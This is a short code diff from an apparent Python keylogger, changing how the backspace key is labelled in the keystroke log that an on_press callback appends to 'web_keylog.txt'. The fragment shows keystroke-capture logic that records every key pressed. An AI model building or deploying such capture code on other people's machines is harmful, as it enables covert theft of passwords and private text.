@@ -34,7 +34,7 @@ def on_press(key):
     except AttributeError:
         if key == keyboard.Key.space: k = " [SPACE] "
         elif key == keyboard.Key.enter: k = " [ENTER]"
-        elif key == keyboard.Key.backspace: k = " [BS] "
+        elif key == keyboard.Key.backspace: k = " [BACKSPACE] "
         else: k = f" [{str(key).replace('Key.', '')}] "
     try:
         with open("web_keylog.txt", "a") as f: f.write(str(k) + " ")
